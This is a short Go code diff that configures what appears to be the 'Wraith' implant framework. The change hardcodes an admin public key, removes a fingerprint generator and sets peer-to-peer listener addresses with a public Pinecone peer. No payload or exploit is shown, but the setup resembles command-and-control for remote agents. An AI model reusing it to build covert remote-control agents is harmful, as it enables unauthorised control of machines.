@@ -3,6 +3,7 @@ package main
 import (
 	"context"
 	"crypto/ed25519"
+	"encoding/hex"
 	"os"
 	"os/signal"
 	"syscall"
@@ -50,14 +51,13 @@ func main() {
 
 	// Prepare some config values
 	_, ownPrivKey, _ := ed25519.GenerateKey(nil)
-	adminPubKey, _, _ := ed25519.GenerateKey(nil)
+	adminPubKey, _ := hex.DecodeString("0d1b9de8a9a2fe6cc30f45fd950d9722bf6d7e1687d18493e1a65e65cb94dd48")
 
 	// Start Wraith in goroutine
 	go w.Spawn(
 		ctx,
 		libwraith.Config{
 			StrainId:                   "none",
-			FingerprintGenerator:       func() string { return "none" },
 			HeartbeatTimeout:           1 * time.Second,
 			ModuleCrashloopDetectCount: 3,
 			ModuleCrashloopDetectTime:  30 * time.Second,
@@ -65,8 +65,8 @@ func main() {
 		&modulepinecomms.ModulePinecomms{
 			OwnPrivKey:   ownPrivKey,
 			AdminPubKey:  adminPubKey,
-			ListenTcp:    true,
-			ListenWs:     true,
+			ListenTcp:    ":0",
+			ListenWs:     ":0",
 			UseMulticast: true,
 			StaticPeers: []string{
 				"wss://pinecone.matrix.org/public",
